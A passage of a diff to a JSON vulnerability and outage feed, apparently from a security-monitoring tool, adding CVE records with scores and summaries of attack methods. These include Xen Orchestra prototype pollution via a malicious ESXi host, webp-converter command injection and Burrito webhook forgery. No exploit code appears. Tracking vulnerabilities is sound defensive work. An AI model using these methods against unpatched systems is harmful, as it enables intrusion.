       "sources": [
-        "cve.org"
+        "nvd"
       ],
       "category": "vuln",
       "resolved_at": "",
@@ -5517,6 +7126,52 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-110111",
+      "aliases": [],
+      "title": "",
+      "description": "Xen Orchestra before 6.9.0 contains an improper access control vulnerability that allows any authenticated user to become global administrator by abusing the unprotected vm.importFromEsxi and vm.importMultipleFromEsxi methods. Attackers can point xo-server at a malicious ESXi host serving a crafted .vmx file with __proto__.permission set, polluting Object.prototype so permission-less accounts inherit admin rights and enabling remote code execution.",
+      "published": "2026-10-13T19:18:43.107",
+      "updated": "2026-10-26T19:16:28.883",
+      "cvss": 7.7,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vatesfr/xen-orchestra/security/advisories/GHSA-mc4m-hc98-rhmv",
+        "https://www.vulncheck.com/advisories/xen-orchestra-before-6.9.0-privilege-escalation-via-prototype-pollution-in-vm-importfromesxi"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00617,
+      "epss_percentile": 0.49289,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "esxi"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 41.5,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 15.4,
+        "rce": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-99059",
       "aliases": [],
       "title": "",
@@ -5566,20 +7221,74 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-69978",
+      "aliases": [],
+      "title": "",
+      "description": "Null pointer dereference in Windows VMSwitch allows an authorized attacker to deny service locally.",
+      "published": "2026-10-13T19:19:08.600",
+      "updated": "2026-10-26T17:30:15.290",
+      "cvss": 5.6,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:C/C:N/I:N/A:H",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69978"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00368,
+      "epss_percentile": 0.30455,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.3,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.2,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-115930",
       "aliases": [],
-      "title": "MongoDB Shell (mongosh) bundled with Node.js trusts certificates issued by recoverable eMudhra intermediate CAs",
+      "title": "",
       "description": "The MongoDB Shell (mongosh) relies on Node.js as a third-party runtime that carries its own TLS root certificate store. This certificate store has the recoverable eMudhra intermediate CA certificates. This issue impacts MongoDB Shell (mongosh) versions prior to 2.14.0 and can be resolved by updating to mongosh 2.14.0 which bundles Node.js 24.22.1 or later. If mongosh is installed through npm, it uses the Node.js runtime installed on the host; update that runtime separately.",
-      "published": "2026-10-26T14:02:51.248Z",
-      "updated": "2026-10-26T15:16:39.480",
+      "published": "2026-10-26T15:16:39.480",
+      "updated": "2026-10-26T16:54:08.707",
       "cvss": 7.6,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+      "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "MongoDB, Inc. mongosh"
-      ],
+      "vendor_products": [],
       "references": [
         "https://www.mongodb.com/docs/mongodb-shell/changelog/"
       ],
@@ -5592,7 +7301,6 @@
       "epss_percentile": null,
       "x_mentions": null,
       "sources": [
-        "cve.org",
         "nvd"
       ],
       "category": "vuln",
@@ -5922,6 +7630,218 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "2026-10-26T15:33:11.752934+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.0,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-62687",
+      "aliases": [],
+      "title": "",
+      "description": "Improper link resolution before file access ('link following') in Windows Backup Engine allows an authorized attacker to disclose information locally.",
+      "published": "2026-10-13T19:18:53.407",
+      "updated": "2026-10-26T16:40:41.643",
+      "cvss": 5.5,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62687"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00506,
+      "epss_percentile": 0.42959,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.0,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-62879",
+      "aliases": [],
+      "title": "",
+      "description": "Missing authentication for critical function in Windows SmartScreen allows an authorized attacker to perform tampering locally.",
+      "published": "2026-10-13T19:18:53.537",
+      "updated": "2026-10-26T16:40:10.133",
+      "cvss": 5.5,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62879"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00351,
+      "epss_percentile": 0.28488,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.0,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69971",
+      "aliases": [],
+      "title": "",
+      "description": "Incorrect authorization in Windows Kernel-Mode Drivers allows an authorized attacker to disclose information locally.",
+      "published": "2026-10-13T19:19:07.813",
+      "updated": "2026-10-26T17:56:50.853",
+      "cvss": 5.5,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69971"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00406,
+      "epss_percentile": 0.34628,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 41.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.0,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69979",
+      "aliases": [],
+      "title": "",
+      "description": "Improper protection of alternate path in Windows AppX Deployment Service allows an authorized attacker to bypass a security feature locally.",
+      "published": "2026-10-13T19:19:08.750",
+      "updated": "2026-10-26T17:28:21.440",
+      "cvss": 5.5,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69979"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00393,
+      "epss_percentile": 0.33249,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
       "matched": [
         "windows"
       ],
@@ -6835,7 +8755,7 @@
       "title": "",
       "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nipv4: udp: Create exceptions before socket matching\n\nCurrently, when ICMP Fragmentation Needed and Redirect Message packets\nare locally delivered and quote a UDP packet, a FIB nexthop exception\n(FNHE) is only created if the kernel can match the UDP packet to an\nexisting socket.\n\nThis behavior allows off-path attackers to conduct a side-channel attack\non the FNHE cache in order to discover the ephemeral port used by a\nconnected UDP socket.\n\nCommit 6457378fe796 (\"ipv4: use siphash instead of Jenkins in\nfnhe_hashfun()\") and commit 67d6d681e15b (\"ipv4: make exception cache\nless predictible\") tried to mitigate such attacks by making it harder\nfor attackers to discover hash collisions in the FNHE cache and by\nrandomizing the number of exceptions a hash bucket can hold,\nrespectively. Unfortunately, both of the mitigations can be bypassed.\n\nInstead, mitigate such attacks by always creating a FNHE, even before\ntrying to find a matching socket. Do that by calling ipv4_update_pmtu()\nand ipv4_redirect(), the helpers used when the quoted packet did not\noriginate from a socket.\n\nThis means that guesses (right or wrong) from an off-path attacker will\nalways result in a FNHE being created or updated in the cache that the\nattacker can observe.\n\nPass an oif of 0, in a similar fashion to icmp_err(). This is also the\noif used by the socket path for sockets that are not bound to a device.\n\nNote that this does not allow attackers to create FNHEs that they could\nnot create before, as both helpers can already be reached with little to\nno validation. For example, by sending an ICMP error that quotes an ICMP\nEcho Reply or one that quotes a UDP source port that matches a wildcard\nsocket.\n\nAlso note that in the good case (matched socket) the above scheme comes\nat the cost of an extra route lookup, as the no socket helpers perform\ntheir own lookup before the one performed by ipv4_sk_update_pmtu() /\nipv4_sk_redirect(). When the two resolve to different nexthops, it also\nresults in two exceptions being created for the same destination IP. One\nin the FNHE cache of the nexthop resolved by the no socket helpers and\nanother in the FNHE cache of the nexthop used by the socket.",
       "published": "2026-10-23T13:17:31.787",
-      "updated": "2026-10-24T14:16:54.650",
+      "updated": "2026-10-26T16:17:24.160",
       "cvss": 7.4,
       "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
       "severity": "high",
@@ -6844,15 +8764,16 @@
       "vendor_products": [],
       "references": [
         "https://git.kernel.org/stable/c/4c3499f79f8c7e8561266bcc220a18538cec0458",
-        "https://git.kernel.org/stable/c/be4fd05398f2b5e42029be70ee875fc749b8ce3a"
+        "https://git.kernel.org/stable/c/be4fd05398f2b5e42029be70ee875fc749b8ce3a",
+        "https://git.kernel.org/stable/c/ecd7ead4bf05e221e90f18a29aec570a50fd1592"
       ],
       "exploit_ref": false,
       "kev": false,
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": 0.0021,
-      "epss_percentile": 0.10672,
+      "epss": 0.00322,
+      "epss_percentile": 0.24994,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -6872,6 +8793,62 @@
         "cvss": 14.8,
         "unauth_network": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69640",
+      "aliases": [],
+      "title": "",
+      "description": "Incorrect authorization in Windows Key Distribution Center allows an authorized attacker to bypass a security feature over a network.",
+      "published": "2026-10-13T19:18:56.867",
+      "updated": "2026-10-26T16:32:55.813",
+      "cvss": 5.3,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69640"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00709,
+      "epss_percentile": 0.53242,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 40.7,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 10.6,
+        "epss": 0.1
       },
       "ai_analysis": ""
     },
@@ -7443,7 +9420,7 @@
       "title": "Cloudflare: Cloudflare Workers build delays",
       "description": "Cloudflare の公式ステータスページに掲載された障害",
       "published": "2026-10-26T15:12:34.756Z",
-      "updated": "2026-10-26T15:12:34.756Z",
+      "updated": "2026-10-26T16:03:32.129Z",
       "cvss": null,
       "cvss_vector": "",
       "severity": "",
@@ -7465,10 +9442,130 @@
         "status:cloudflare"
       ],
       "category": "outage",
-      "resolved_at": "",
+      "resolved_at": "2026-10-26T16:03:32.129Z",
       "first_seen": "2026-10-26T15:33:11.752934+00:00",
       "matched": [
         "cloudflare"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-github-f1vvv30224wd",
+      "aliases": [],
+      "title": "GitHub: Incident with Actions, Issues, API Requests and Pull Requests",
+      "description": "GitHub の公式ステータスページに掲載された障害",
+      "published": "2026-10-26T18:48:26.235Z",
+      "updated": "2026-10-26T18:57:22.958Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://stspg.io/0622ty903b4d"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:github"
+      ],
+      "category": "outage",
+      "resolved_at": "2026-10-26T18:57:22.958Z",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "github"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-datadog-hnk297tpxhyk",
+      "aliases": [],
+      "title": "Datadog: Elevated Error Rates for Workflow Automation, App Builder, Bits Code, Bits Agent Builder",
+      "description": "Datadog の公式ステータスページに掲載された障害",
+      "published": "2026-10-26T13:26:43.461-04:00",
+      "updated": "2026-10-26T14:23:21.476-04:00",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://stspg.io/rq69kpmmw7h6"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:datadog"
+      ],
+      "category": "outage",
+      "resolved_at": "2026-10-26T14:23:21.476-04:00",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "datadog"
+      ],
+      "match_type": "status",
+      "tier": null,
+      "score": 40.0,
+      "level": "medium",
+      "score_breakdown": {},
+      "ai_analysis": ""
+    },
+    {
+      "id": "OUT-openai-01M5WPZTT0385GMEV1353ZC4AM",
+      "aliases": [],
+      "title": "OpenAI: Elevated error rates for Ads POST requests",
+      "description": "OpenAI の公式ステータスページに掲載された障害",
+      "published": "2026-10-26T18:19:00Z",
+      "updated": "2026-10-26T18:30:18Z",
+      "cvss": null,
+      "cvss_vector": "",
+      "severity": "",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://status.openai.com"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "status:openai"
+      ],
+      "category": "outage",
+      "resolved_at": "2026-10-26T18:30:18Z",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "openai"
       ],
       "match_type": "status",
       "tier": null,
@@ -7630,6 +9727,60 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-69969",
+      "aliases": [],
+      "title": "",
+      "description": "Improper link resolution before file access ('link following') in Windows AppX Deployment Service allows an authorized attacker to disclose information locally.",
+      "published": "2026-10-13T19:19:07.500",
+      "updated": "2026-10-26T17:59:05.977",
+      "cvss": 4.7,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69969"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00376,
+      "epss_percentile": 0.31369,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 39.5,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 9.4,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-69506",
       "aliases": [],
       "title": "",
@@ -7674,6 +9825,62 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 39.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 9.4,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69974",
+      "aliases": [],
+      "title": "",
+      "description": "Out-of-bounds read in Desktop Window Manager allows an authorized attacker to disclose information locally.",
+      "published": "2026-10-13T19:19:08.083",
+      "updated": "2026-10-26T17:54:41.677",
+      "cvss": 4.7,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69974"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00332,
+      "epss_percentile": 0.26263,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
       "matched": [
         "windows"
       ],
@@ -8028,6 +10235,52 @@
       "score_breakdown": {
         "popularity": 20,
         "cvss": 13.8,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-102649",
+      "aliases": [],
+      "title": "",
+      "description": "Burrito is a Terraform Automation Collaboration Software (TACoS) Kubernetes operator. Prior to 0.13.0, `POST /api/webhook` accepts unsigned GitHub and GitLab events when a `TerraformRepository`'s credentials omit `webhookSecret` or set it to an empty value, including credentials configured for git authentication and polling. `Credential.WebhookSecret` is optional, and `go-playground/webhooks` skips signature or token verification when the secret is empty. Anyone who can reach `burrito-server`'s endpoint and knows a tracked repository's URL can forge events to create or delete `TerraformPullRequest` custom resources with attacker-chosen `Branch`, `Base`, and `ID` fields. For GitHub `pull_request` events, the controller fetches changed files using the real pull request number but does not cross-check the payload's branch against that pull request. Pairing a real, existing pull request number with an unrelated existing branch in the same repository can therefore cause an unauthorized `terraform plan` for affected layers using the operator's stored git and cloud credentials. Code analysis also indicates that the resulting plan can be posted to the real pull request's comment thread, exposing and misattributing another branch's infrastructure changes. Auto-apply is disabled for these temporary layers, so this vulnerability alone cannot force a `terraform apply`; plan-time provider and data-source code execution depends on the selected branch's contents. This issue is fixed in version 0.13.0.",
+      "published": "2026-10-26T18:17:21.803",
+      "updated": "2026-10-26T18:39:42.503",
+      "cvss": 9.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/padok-team/burrito/commit/1d48432a4a0126429c99f5fa42567bf3711d1ca1",
+        "https://github.com/padok-team/burrito/releases/tag/v0.13.0",
+        "https://github.com/padok-team/burrito/security/advisories/GHSA-7m68-72r6-3jx8"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "kubernetes"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 38.8,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 19.8,
         "unauth_network": 5
       },
       "ai_analysis": ""
@@ -8417,6 +10670,57 @@
         "cvss": 13.0,
         "unauth_network": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-110635",
+      "aliases": [],
+      "title": "",
+      "description": "webp-converter before 3.0.0 contains an OS command injection vulnerability in src/webpconverter.js helpers that run libwebp binaries via execFile with shell enabled. Attackers controlling file names or option strings passed to cwebp, dwebp, gwebp, or webpmux functions can inject shell metacharacters to execute OS commands as the Node.js process.",
+      "published": "2026-10-14T15:17:16.560",
+      "updated": "2026-10-26T17:17:15.063",
+      "cvss": 9.3,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "critical",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/scionoftech/webp-converter",
+        "https://github.com/scionoftech/webp-converter/blob/3729b65f1e904ab56b947ac3772020ce37a756c8/src/webpconverter.js#L41-L52",
+        "https://github.com/scionoftech/webp-converter/blob/e09d963d772cae9ff6af63c268ca838ab334f861/CHANGELOG.md",
+        "https://github.com/scionoftech/webp-converter/commit/f1b6724bc2e89f67ab05d51a854b4b1c5a99928a",
+        "https://github.com/scionoftech/webp-converter/pull/53",
+        "https://github.com/scionoftech/webp-converter/pull/53#issuecomment-5091652605",
+        "https://www.vulncheck.com/advisories/webp-converter-before-3.0.0-os-command-injection-via-file-names-and-options"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.02521,
+      "epss_percentile": 0.8474,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "libwebp"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 38.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 18.6,
+        "unauth_network": 5,
+        "epss": 0.4
       },
       "ai_analysis": ""
     },
@@ -11020,6 +13324,52 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-98166",
+      "aliases": [],
+      "title": "",
+      "description": "In the Linux kernel, the following vulnerability has been resolved:\n\ndrm/ttm: fix swapped-out resources never leaving their bulk_move range\n\nttm_tt_swapout() returns the number of pages swapped out on success and\na negative error code on failure; for a populated ttm it never returns\nzero. Commit b2ed01e7ad3d (\"drm/ttm: Fix ttm_bo_swapout() infinite LRU\nwalk on swapout failure\") moved the bulk_move bookkeeping in\nttm_bo_swapout_cb() under \"if (!ret)\", so the\nttm_resource_del_bulk_move_unevictable() / ttm_resource_move_to_lru_tail()\npair is now skipped on every successful swapout. The equivalent change\nfor the shrinker in commit 1d59f36e95f7 (\"drm/ttm: Fix ttm_bo_shrink()\ninfinite LRU walk on backup failure\") tests \"lret > 0\", which is what\nwas intended here as well.\n\nBefore b2ed01e7ad3d the resource was taken off the bulk_move before the\nswapout; since then a swapped-out resource stays inside its BO's\nbulk_move range (and on the manager LRU) although it is unevictable.\nWhen it is later freed or the BO leaves the bulk_move\n(ttm_resource_free(), ttm_bo_set_bulk_move() via amdgpu_vm_bo_del()),\nttm_resource_del_bulk_move() skips it because of its\n!ttm_resource_unevictable() guard, so a range endpoint in pos->first /\npos->last is left pointing at freed memory. The next\nttm_lru_bulk_move_tail() or ttm_resource_add_bulk_move() on that cursor\nis a use-after-free, seen as the resv WARN in ttm_lru_bulk_move_add(),\n\"list_del corruption\" in ttm_resource_move_to_lru_tail() or a NULL\ndereference in ttm_resource_manager_next() -- minutes to hours after a\nhibernation, or at process exit / reboot following one. Samuel\nAinsworth's analysis of drm/amd issue 5387 (see Link) identified the\ndangling cursor; the missing removal at swapout time is the reason it\ndangles.\n\nTesting the 